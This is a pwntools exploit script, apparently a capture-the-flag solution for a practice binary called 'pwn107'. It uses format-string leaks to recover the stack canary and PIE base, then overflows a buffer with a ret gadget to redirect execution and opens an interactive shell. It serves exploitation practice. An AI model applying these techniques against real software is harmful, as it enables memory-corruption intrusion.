from pwn import *

elf = context.binary = ELF("./pwn107")
context.arch = 'amd64'

def fuzzer():
	for i in range(50):
		p = process()
		payload = f"%{i}$p".encode()
		p.sendlineafter(b"streak? ", payload)
		p.recvuntil(b"streak: ")
		response = p.recvline()
		log.success(f"Position {i}: {response}")
		p.close()

def leakage():
	p = process()
	payload = b"%13$p.%17$p"
	p.sendlineafter(b"streak? ", payload)
	p.recvuntil(b"streak: ")
	response = p.recvline().strip()
	leaks = response.split(b".")
	canary = int(leaks[0], 16)
	log.success(f"Canary is: {hex(canary)}")
	main_leak = int(leaks[1], 16)
	log.success(f"Main address is: {hex(main_leak)}")
	elf.address = main_leak - elf.symbols['main']
	log.success(f"Elf address is: {hex(elf.address)}")
	
	offset = b"A" * 24
	get_streak = main_leak - 0x46
	rop = ROP(elf)
	ret = rop.find_gadget(['ret'])[0]

	payload = flat(
			offset,
			canary,
			b"B" * 8,
			ret,
			get_streak
		)

	p.recvline()
	p.sendline(payload)
	p.interactive()


if __name__ == '__main__':
	leakage()
